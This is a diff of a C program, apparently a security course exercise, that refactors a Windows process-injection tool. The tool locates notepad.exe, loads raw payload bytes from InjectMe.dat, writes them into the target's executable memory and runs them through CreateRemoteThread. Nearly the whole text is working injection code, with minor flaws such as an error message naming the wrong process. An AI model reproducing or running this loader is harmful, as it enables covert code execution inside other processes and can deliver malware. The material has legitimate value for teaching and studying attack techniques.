@@ -3,18 +3,16 @@
 
 #include "stdafx.h"
 FILE* f;
-int str_ends_with(const char * str, const char * suffix) {
-
-  if( str == NULL || suffix == NULL )
-	return 0;
-
-  size_t str_len = strlen(str);
-  size_t suffix_len = strlen(suffix);
-
-  if(suffix_len > str_len)
-	return 0;
-
-  return 0 == _stricmp( str + str_len - suffix_len, suffix);
+BOOL str_ends_with(const char * str, const char * suffix) {
+	size_t str_len;
+	size_t suffix_len;
+	if( str == NULL || suffix == NULL )
+		return FALSE;
+	str_len = strlen(str);
+	suffix_len = strlen(suffix);
+	if(suffix_len > str_len)
+		return FALSE;
+	return 0 == strncmp( str + str_len - suffix_len, suffix, suffix_len );
 }
 
 
@@ -30,26 +28,23 @@ void _die(char * arg, int retVal) {
 	exit(retVal);
 };
 
-void _die(char * arg) {
-	_die(arg, -1);
-};
-
 #define DLL_FILE_NAME "cptnhook.dll"
 #define PROC_NAME "HookProc"
 
 BOOL _isProcessNamed(DWORD processID, const char * name) {
 	char processName[MAX_PATH];
-	processName[0] = NULL;
-	HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
+	HANDLE hProcess;
+	HMODULE hMod;
+	DWORD cbNeeded;
+	processName[0] = 0;
+	hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ , FALSE, processID);
 	if (hProcess != NULL) {
-		HMODULE hMod;
-		DWORD cbNeeded;
 		if (EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
 			GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName)/sizeof(TCHAR));
 		}
 	}
 	CloseHandle(hProcess);
-	f = fopen("c:\\temp.txt", "a");
+	fopen_s(&f, "c:\\temp.txt", "a");
 	fprintf(f, "%s\n", processName);
 	fclose(f);
 	return 0 == _stricmp(processName, name);
@@ -62,88 +57,98 @@ DWORD findProcessByName(const char * name) {
 	DWORD aProcesses[1024], cbNeeded, cProcesses;
 	unsigned int i;
 	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
-		return NULL;
+		return 0;
 	}
 	cProcesses = cbNeeded / sizeof(DWORD);
 	for (i = 0; i < cProcesses; i++) {
-		if( aProcesses[i] != NULL) {
+		if( aProcesses[i] != 0) {
 			if (_isProcessNamed(aProcesses[i], name)) {
 				return aProcesses[i];
 			}
 		}
 	}
-	return NULL;
+	return 0;
 }
 
-int _tmain(int argc, _TCHAR* argv[]) {
+int _tmain() {
+	int pid, ret;
+	HANDLE process;
+	FILE* inject;
+	byte buf[201];
+	size_t bytesRead;
+	LPVOID address;
+	SIZE_T bytesWritten;
+	BOOL wrote, changed, freeOK;
+	DWORD oldProtect;
+	HANDLE hThread;
+	LPTHREAD_START_ROUTINE startRoutine;
 	typedef HHOOK (*HINSTALLER)(HMODULE);
 	typedef BOOL (*HUNINSTALLER)(HHOOK);
 	fopen_s(&f, "c:\\temp.txt", "w");
 	fclose(f);
 
-	int pid = findProcessByName("notepad.exe");
-	if (pid == NULL) {
-		_die("Failed to find explorer.exe");
+	pid = findProcessByName("notepad.exe");
+	if (pid == 0) {
+		_die("Failed to find explorer.exe", -1);
 	}
 	fopen_s(&f, "c:\\temp.txt", "a");
 	fprintf(f, "pid: %d\n", pid);
 	fclose(f);
-	HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
+	process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, FALSE, pid);
 	if (process == NULL) {
-		_die("Failed to OpenProcess !");
+		_die("Failed to OpenProcess !", -2);
 	}
 	fopen_s(&f, "c:\\temp.txt", "a");
 	fprintf(f, "pHandle: %d\n", process);
 	fclose(f);
 
-	FILE* inject = NULL;
-	byte buf[201];
-	int ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
-	if (NULL != ret){
+	inject = NULL;
+	ret =fopen_s(&inject,"C:\\Documents and Settings\\Administrator\\My Documents\\GitHub\\kj-security-ex1\\ex4\\InjectMe.dat","rb");
+	if (0 != ret){
 
-		_die("Failed to open InjectMe !");
+		_die("Failed to open InjectMe !", -3);
 	}
-	size_t bytesRead = fread(buf,1,201,inject);
+	bytesRead = fread(buf,1,201,inject);
 	if (201 != bytesRead){
-		_die("Failed to read enough !");
+		_die("Failed to read enough !", -4);
 	}
 	
 	fclose(inject);
 
-	LPVOID address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	address = VirtualAllocEx(process, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (address == NULL) {
 		CloseHandle(process);
-		_die("Failed to VirtualAllocEx !");
+		_die("Failed to VirtualAllocEx !", -5);
 	}
 
-	SIZE_T bytesWritten = 0;
-	BOOL wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
-	if (NULL == wrote){
-		_die("Failed to write memory !");
+	bytesWritten = 0;
+	wrote = WriteProcessMemory(process,address,buf,sizeof(buf),&bytesWritten);
+	if (!wrote){
+		_die("Failed to write memory !", -6);
 	}
 	if (bytesWritten != sizeof(buf)){
-		_die("Failed to write enough memory !");
+		_die("Failed to write enough memory !", -7);
 	}
-	DWORD oldProtect = NULL;
-	BOOL changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
+	oldProtect = 0;
+	changed = VirtualProtectEx(process,address,sizeof(buf),PAGE_EXECUTE_READWRITE,&oldProtect);
 	if (!changed){
 				int err = GetLastError();
 		fopen_s(&f, "c:\\temp.txt", "a");
 		fprintf(f, "err: %d\n", err);
 		fclose(f);
-		_die("Failed to change permission!");
+		_die("Failed to change permission!", -8);
 
 	}
-
-	HANDLE hThread = CreateRemoteThread(process,NULL,NULL,(LPTHREAD_START_ROUTINE)address,NULL,NULL,NULL);
+	startRoutine = (LPTHREAD_START_ROUTINE)address;
+	hThread = CreateRemoteThread(process,NULL,0,startRoutine,NULL,0,NULL);
 	if (NULL == hThread){
-		_die("Failed to create remote thread !");
+		_die("Failed to create remote thread !", -9);
 	}
 
-	BOOL freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
+	freeOK = VirtualFreeEx(process, address, 0, MEM_RELEASE);
 	if (!freeOK) {
 		CloseHandle(process);
-		_die("Failed to VirtualFreeEx !");
+		_die("Failed to VirtualFreeEx !", -10);
 	}
 
 // TODO
